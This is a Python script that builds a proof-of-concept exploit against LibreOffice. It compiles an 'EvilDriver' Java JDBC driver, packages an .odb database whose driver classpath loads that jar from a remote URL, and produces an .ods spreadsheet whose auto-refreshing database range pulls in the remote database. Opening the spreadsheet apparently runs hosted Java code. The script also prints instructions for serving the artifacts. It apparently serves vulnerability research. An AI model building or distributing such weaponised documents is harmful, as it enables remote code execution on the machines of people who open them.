#!/usr/bin/env python3
from __future__ import annotations

import argparse
import shutil
import subprocess
import sys
import tempfile
import zipfile
from pathlib import Path
from xml.sax.saxutils import quoteattr


BASE = Path(__file__).resolve().parent
SRC = BASE / "src" / "EvilDriver.java"
PAYLOADS = BASE / "payloads"
HOSTED = BASE / "hosted_artifacts"
BUILD = BASE / "build"


def run(cmd: list[str], cwd: Path | None = None) -> None:
    print("+", " ".join(cmd))
    subprocess.run(cmd, cwd=cwd, check=True)


def require(name: str) -> str:
    path = shutil.which(name)
    if not path:
        raise SystemExit(f"error: required tool not found: {name}")
    return path


def clean_dirs() -> None:
    for path in (PAYLOADS, HOSTED, BUILD):
        if path.exists():
            shutil.rmtree(path)
        path.mkdir(parents=True)


def build_jar() -> None:
    javac = require("javac")
    jar = require("jar")
    classes = BUILD / "classes"
    classes.mkdir(parents=True)
    try:
        run([javac, "--release", "8", "-d", str(classes), str(SRC)])
    except subprocess.CalledProcessError:
        run([javac, "-source", "8", "-target", "8", "-d", str(classes), str(SRC)])
    run([jar, "cf", str(HOSTED / "evil-calculator-driver.jar"), "-C", str(classes), "."])


def make_odb(host_url: str) -> None:
    classpath = f"jar:{host_url}/evil-calculator-driver.jar!/"
    content_xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:db="urn:oasis:names:tc:opendocument:xmlns:database:1.0" office:version="1.2">
  <office:body>
    <office:database>
      <db:data-source>
        <db:connection-data>
          <db:connection-resource xlink:href="jdbc:evil"/>
          <db:login db:is-password-required="false"/>
        </db:connection-data>
        <db:driver-settings db:java-driver-class="EvilDriver" db:java-classpath={quoteattr(classpath)}/>
        <db:application-connection-settings/>
      </db:data-source>
    </office:database>
  </office:body>
</office:document-content>
'''
    manifest_xml = '''<?xml version="1.0" encoding="UTF-8"?>
<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.2">
  <manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.database"/>
  <manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>
  <manifest:file-entry manifest:full-path="settings.xml" manifest:media-type="text/xml"/>
  <manifest:file-entry manifest:full-path="database/properties" manifest:media-type=""/>
  <manifest:file-entry manifest:full-path="database/script" manifest:media-type=""/>
</manifest:manifest>
'''
    settings_xml = '''<?xml version="1.0" encoding="UTF-8"?>
<office:document-settings xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" office:version="1.2">
  <office:settings/>
</office:document-settings>
'''
    out = HOSTED / "poc-calculator.odb"
    with zipfile.ZipFile(out, "w") as zf:
        zf.writestr(zipfile.ZipInfo("mimetype"), "application/vnd.oasis.opendocument.database", compress_type=zipfile.ZIP_STORED)
        zf.writestr("content.xml", content_xml)
        zf.writestr("settings.xml", settings_xml)
        zf.writestr("database/properties", "version=1.8.0\n")
        zf.writestr("database/script", "")
        zf.writestr("META-INF/manifest.xml", manifest_xml)


def make_fods(host_url: str, refresh_delay: str) -> Path:
    odb_url = f"{host_url}/poc-calculator.odb"
    fods = PAYLOADS / "onefile-dbrange-http.fods"
    fods.write_text(f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document
  xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
  xmlns:style="urn:oasis:names:tc:opendocument:xmlns:style:1.0"
  xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"
  xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0"
  xmlns:calcext="urn:org:documentfoundation:names:experimental:calc:xmlns:calcext:1.0"
  xmlns:fo="urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0"
  office:version="1.3"
  office:mimetype="application/vnd.oasis.opendocument.spreadsheet">
  <office:styles>
    <style:default-style style:family="table-cell"><style:text-properties fo:font-size="10pt"/></style:default-style>
  </office:styles>
  <office:body>
    <office:spreadsheet>
      <table:table table:name="Sheet1">
        <table:table-column table:number-columns-repeated="4"/>
        <table:table-row>
          <table:table-cell office:value-type="string" calcext:value-type="string"><text:p>database range refresh probe</text:p></table:table-cell>
        </table:table-row>
        <table:table-row table:number-rows-repeated="12"><table:table-cell table:number-columns-repeated="4"/></table:table-row>
      </table:table>
      <table:named-expressions/>
      <table:database-ranges>
        <table:database-range table:name="Import1" table:target-range-address="Sheet1.A3:Sheet1.B8" table:contains-header="false" table:refresh-delay={quoteattr(refresh_delay)}>
          <table:database-source-sql table:database-name={quoteattr(odb_url)} table:sql-statement="SELECT 1"/>
        </table:database-range>
      </table:database-ranges>
    </office:spreadsheet>
  </office:body>
</office:document>
''', encoding="utf-8")
    return fods


def build_ods(fods: Path) -> None:
    soffice = shutil.which("libreoffice") or shutil.which("soffice")
    if not soffice:
        raise SystemExit("error: required tool not found: libreoffice or soffice")
    with tempfile.TemporaryDirectory(prefix="lo-build-profile-") as profile:
        run([
            soffice,
            "--headless",
            "--nologo",
            "--nodefault",
            "--nofirststartwizard",
            "--norestore",
            f"-env:UserInstallation=file://{profile}",
            "--convert-to",
            "ods",
            "--outdir",
            str(PAYLOADS),
            str(fods),
        ])


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host-url", default="http://127.0.0.1:8000", help="base URL serving hosted_artifacts")
    parser.add_argument("--refresh-delay", default="PT1S", help="ODS database range refresh delay")
    args = parser.parse_args()

    host_url = args.host_url.rstrip("/")
    clean_dirs()
    build_jar()
    make_odb(host_url)
    build_ods(make_fods(host_url, args.refresh_delay))

    print("\ncreated:")
    print(f"  {PAYLOADS / 'onefile-dbrange-http.ods'}")
    print(f"  {HOSTED / 'poc-calculator.odb'}")
    print(f"  {HOSTED / 'evil-calculator-driver.jar'}")
    print("\nhost with:")
    print(f"  cd {HOSTED} && python3 -m http.server PORT")
    return 0


if __name__ == "__main__":
    sys.exit(main())
